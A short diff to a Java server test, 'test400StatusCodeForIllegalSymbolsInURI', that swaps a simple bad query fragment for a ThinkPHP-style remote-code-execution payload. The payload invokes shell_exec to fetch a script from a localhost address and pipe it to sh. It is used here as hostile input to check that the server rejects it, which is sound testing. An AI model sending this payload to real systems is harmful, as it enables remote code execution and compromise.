@@ -54,7 +54,9 @@ public class ExceptionTest extends AbstractJettyServerTester {
     public void test400StatusCodeForIllegalSymbolsInURI() throws IOException {
         startServer(ExceptionResource.class);
         URI testUri = getUri().build();
-        String incorrectFragment = "&params[0]=test_status";
+        String incorrectFragment = "/v1/abcdefgh/abcde/abcdef/abc/a/%3Fs=/Index/\\x5Cthink\\x5Capp/invokefunction"
+                + "&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://127.0"
+                + ".0.1/ldr.sh|sh";
         BasicHttpRequest request = new BasicHttpRequest("GET", testUri + incorrectFragment);
         CloseableHttpClient client = HttpClientBuilder.create().build();
 
